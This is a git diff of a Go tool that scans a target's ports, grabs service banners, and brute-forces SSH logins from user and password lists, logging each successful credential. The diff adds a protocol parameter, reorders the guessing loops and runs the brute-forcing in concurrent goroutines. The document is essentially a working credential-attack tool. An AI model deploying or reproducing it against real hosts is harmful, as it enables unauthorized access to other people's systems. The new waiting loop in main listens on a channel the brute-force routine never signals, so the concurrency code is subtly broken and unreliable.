@@ -17,25 +17,7 @@ var users []string
 var passwords []string
 var sshPorts []int
 
-func main() {
-	greeting()
-
-	userList, passwordList, ipToScan, portsRange := checkArgs()
-
-	users = readUsers(userList)
-	passwords = readPasswords(passwordList)
-
-	minPort, maxPort := getPortsRange(portsRange)
-
-	scan(minPort, maxPort, ipToScan)
-
-	for _, p := range sshPorts {
-		sshBrute(users, passwords, ipToScan, p)
-	}
-
-}
-
-func greeting() {
+func greeting(version string) {
 	fmt.Println("")
 	fmt.Println("                                    dP                                                    dP dP ")
 	fmt.Println("                                    88                                                    88 88 ")
@@ -51,7 +33,7 @@ func greeting() {
 	fmt.Println("Inspired by @id2746")
 	fmt.Println("Developed by @PiterPentester")
 	fmt.Println("")
-	fmt.Println("Version: 0.1alpha")
+	fmt.Println("Version:", version)
 	fmt.Println("")
 }
 
@@ -87,12 +69,12 @@ func getPortsRange(r string) (int, int) {
 	return min, max
 }
 
-func scan(minPort, maxPort int, ipToScan string) {
+func scan(minPort, maxPort int, ipToScan, protocol string) {
 	activeThreads := 0
 	doneChannel := make(chan bool)
 
 	for port := minPort; port <= maxPort; port++ {
-		go testTCPConnection(ipToScan, port, doneChannel)
+		go testTCPConnection(ipToScan, port, protocol, doneChannel)
 		activeThreads++
 	}
 
@@ -103,19 +85,19 @@ func scan(minPort, maxPort int, ipToScan string) {
 	}
 }
 
-func testTCPConnection(ip string, port int, doneChannel chan bool) {
-	_, err := net.DialTimeout("tcp", ip+":"+strconv.Itoa(port), time.Second*10)
+func testTCPConnection(ip string, port int, protocol string, doneChannel chan bool) {
+	_, err := net.DialTimeout(protocol, ip+":"+strconv.Itoa(port), time.Second*10)
 	if err == nil {
 		log.Printf("Port %d: Open\n", port)
 
-		grabBanner(ip, port)
+		grabBanner(ip, port, protocol)
 	}
 	doneChannel <- true
 }
 
-func grabBanner(ip string, port int) {
+func grabBanner(ip string, port int, protocol string) {
 	connection, cErr := net.DialTimeout(
-		"tcp",
+		protocol,
 		ip+":"+strconv.Itoa(port),
 		time.Second*10,
 	)
@@ -174,11 +156,11 @@ func readPasswords(filename string) []string {
 	return txtlines
 }
 
-func sshBrute(users, passwords []string, ip string, port int) {
+func sshBrute(users, passwords []string, ip string, port int, protocol string) {
 	host := ip + ":" + strconv.Itoa(port)
 
-	for _, user := range users {
-		for _, pass := range passwords {
+	for _, pass := range passwords {
+		for _, user := range users {
 			config := &ssh.ClientConfig{
 				User: user,
 				Auth: []ssh.AuthMethod{
@@ -186,7 +168,7 @@ func sshBrute(users, passwords []string, ip string, port int) {
 				},
 				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 			}
-			client, err := ssh.Dial("tcp", host, config)
+			client, err := ssh.Dial(protocol, host, config)
 			if err != nil {
 				log.Println("[-] Error dialing server. ", "user: ", user, "password: ", pass, err)
 				continue
@@ -195,4 +177,34 @@ func sshBrute(users, passwords []string, ip string, port int) {
 			log.Println("[+] Login successful", host, "user: ", user, "password: ", pass, string(client.ClientVersion()))
 		}
 	}
+}
+
+func main() {
+	version := "0.2alpha"
+	greeting(version)
+
+	userList, passwordList, ipToScan, portsRange := checkArgs()
+
+	users = readUsers(userList)
+	passwords = readPasswords(passwordList)
+
+	minPort, maxPort := getPortsRange(portsRange)
+	protocol := "tcp"
+
+	scan(minPort, maxPort, ipToScan, protocol)
+
+	activeThreads := 0
+	doneChannel := make(chan bool)
+
+	for _, p := range sshPorts {
+		go sshBrute(users, passwords, ipToScan, p, protocol)
+		activeThreads++
+	}
+
+	// Wait for all threads to finish
+	for activeThreads > 0 {
+		<-doneChannel
+		activeThreads--
+	}
+
 }
